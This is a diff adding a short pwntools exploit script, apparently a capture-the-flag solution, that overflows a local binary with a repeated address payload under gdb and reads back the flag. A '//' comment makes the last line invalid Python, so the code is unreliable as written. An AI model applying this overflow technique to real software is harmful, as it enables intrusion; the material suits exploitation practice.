@@ -1,0 +1,29 @@
+from pwn import *
+
+#p = gdb.debug(args=['./ex0'],gdbscript='r')
+
+p=process('./ex0')
+
+
+
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+
+
+
+context.log_level='debug'
+
+flag = 0x0804A060
+
+payload = p32(0x0804A060)*0x80
+
+
+
+gdb.attach(proc.pidof(p)[0],gdbscript='b *0x804853d')
+
+
+
+p.sendline(payload)
+
+pause()
+
+p.recvuntil("}") //大部分flag以}结尾，当然这样写p.recvall()或p.recvline()都可以
